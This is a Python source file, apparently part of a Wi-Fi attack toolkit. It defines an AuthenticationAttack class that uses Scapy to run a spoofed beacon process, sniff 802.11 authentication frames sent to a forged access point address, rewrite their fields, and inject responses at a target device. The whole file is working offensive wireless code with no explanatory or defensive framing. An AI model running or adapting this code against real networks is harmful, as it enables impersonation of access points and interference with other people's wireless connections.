from scapy.all import *
import random
import multiprocessing
import time
import sys

from utilities import *
from beaconAttack import *

SEQUENCE_NUMBER = 2
ALGO_NUMBER = 0
SLEEP_TIME = 1

class AuthenticationAttack:
	def __init__(self, name, length, isProtected, isVerbose, target, source, monitor, injector):
		self.name = name
		self.length = length
		self.isProtected = isProtected
		self.isVerbose = isVerbose
		self.target = target
		self.source = source
		self.monitor = monitor
		self.injector = injector
		self.beaconThread = None

	def __authentication(self):
		isFirstAuth = True
		def sniffAuthPkts(pkt):
			nonlocal isFirstAuth
			if(pkt.haslayer(Dot11Auth) and pkt.getlayer(Dot11).addr1 == self.source):
				if(isFirstAuth):
					print("received authentication request")
					self.beaconThread.terminate()
					isFirstAuth = False

				pkt.addr1, pkt.addr2, pkt.addr3 = self.target, self.source, self.source
				pkt.seqnum = SEQUENCE_NUMBER
				pkt.algo = ALGO_NUMBER
				sendp(pkt, iface = self.injector, verbose = self.isVerbose)

		sniff(iface = self.monitor, prn = sniffAuthPkts)

	def authenticationAttack(self):
		beaconClass = BeaconAttack(self.name, self.length, self.isProtected, self.isVerbose, self.target, self.source, self.monitor, self.injector)
		self.beaconThread = multiprocessing.Process(target = beaconClass.beaconAttack)
		self.beaconThread.start()
		self.__authentication()
		while(1):
			time.sleep(SLEEP_TIME)
